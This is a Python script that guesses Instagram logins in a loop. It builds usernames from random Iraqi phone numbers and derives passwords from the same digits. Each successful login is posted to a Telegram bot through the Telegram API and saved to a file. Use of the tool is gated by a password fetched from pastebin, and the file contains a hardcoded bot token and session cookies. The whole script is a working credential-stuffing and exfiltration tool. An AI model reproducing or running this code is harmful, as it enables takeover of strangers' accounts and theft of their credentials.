import os
try:
    import uuid
except:
    os.system ("pip install uuid")
try:
    from random import *
except:
    os.systeam("pip install random ")
try:
     import string

except:
    os.system("pip install string")
try:
    import requests 

except:
    os.system ("pip install requests ")
try:
    from user_agent import generate_user_agent

except:
    os.system("pip install user_agent ")
try:
    from datetime import datetime
except:
    os.system("pip install datetime ")
try:
    import time
except:
    os.system("pip install time")
os.system("clear")

import random
import uuid
import requests
import string
from user_agent import generate_user_agent
from datetime import datetime
from random import *
from time import sleep
import requests
import os
import random
import json
import threading
import secrets,uuid
from colorama import Fore, Style
from time import sleep
from datetime import datetime
from secrets import token_hex
from uuid import uuid4
from user_agent import generate_user_agent




E = '\033[1;31m'
G = '\033[1;32m'
S = '\033[1;33m'


#ID = '834051745'
ID = input (S+'𝐈𝐃 ➥ ==> : ')
token = input (G+ '𝐓𝐎𝐊𝐄𝐍 ➥ ==> : ')
#token = '1827430133:AAHUgKaDPY9oD55QF_Wz6jnys3CavnBSPL0'

w = 'https://pastebin.com/raw/ZWUcDsu2'
Password = input("[+] Enter your password :")
rss = requests.get(w).text

if Password in rss:
    sleep(0.10)
    print (G+"جاري الصيد برعاية سجاد 😈....")
    sleep(0.10)
    #ID = '834051745'

   # token = '1827430133:AAHUgKaDPY9oD55QF_Wz6jnys3CavnBSPL0'
    r = requests.Session()

    user = '1234567890'


    while True:

        us = str("".join(random.choice(user)for i in range(8)))

        username = '96477'+us

        password = '077'+us

        url = 'https://www.instagram.com/accounts/login/ajax/?hl=en'



        headers = {
        'accept': '*/*',
        'accept-encoding': 'gzip, deflate, br',
        'accept-language': 'en-US,en;q=0.9',
        'content-length': '337',
        'content-type': 'application/x-www-form-urlencoded',
        'cookie': 'mid=YNZ4DAAEAAHB2YRZAqRyrfMLjcN5; ig_did=BDA7CD3E-60BD-4CCD-84F7-53E28EA5F88B; ig_nrcb=1; csrftoken=kDl2BPpKFnRSDug3FAXhWjSROPKizOIP',
        'origin': 'https://www.instagram.com',
        'referer': 'https://www.instagram.com/accounts/login/?hl=en',
        'sec-ch-ua': '" Not;A Brand";v="99", "Google Chrome";v="91", "Chromium";v="91"',
        'sec-ch-ua-mobile': '?0',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'same-origin',
        'user-agent': 'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
        'x-asbd-id': '437806',
        'x-csrftoken': 'kDl2BPpKFnRSDug3FAXhWjSROPKizOIP',
        'x-ig-app-id': '936619743392459',
        'x-ig-www-claim': '0',
        'x-instagram-ajax': '10d8a776de59',
        'x-requested-with': 'XMLHttpRequest',             
                       
 }




                

                

        data = {
        'username':username,
        'enc_password': '#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
        'queryParams': '{"hl":"en"}',
        'optIntoOneTap': 'false',
                        }
        req_login = r.post(url,headers=headers,data=data, proxies=None)
        if ("userId") in req_login.text:
            tlg =(f'''https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text=🇮🇶sajad 𝒉𝒖𝒏𝒕𝒆𝒓🇮🇶  🍯 ✅\n🇮🇶➧ 𝒆𝒎𝒂𝒊𝒍 𖠨 ➦ : [→ {user} ←] \n🇮🇶 ➧ 𝑷𝑨𝑺𝑺𝑾𝑶𝑹𝑫 ꕤ ➦ :  [→ {password} ←] \n- 𝐅𝐫𝐎𝐦 : @P4ORO - @H5QQQ ''')
            i = requests.post(tlg)
            print (G+'username ==> : '+username+': password ==> : '+password)
            with open('insta.txt','a') as HACKED:
                HACKED.write(' [-] UserName : {} \n [-] Passowrd : {} \n\n'.format(username,password))
        else:
            print (E+'username ==> : '+username+': password ==> : '+password)
else:
    print ("نهتت الفترة المجانية راسل المطور لتفعيل ")
    print ("معرف المطورين")
    print ("@P4ORO\@H5QQQ")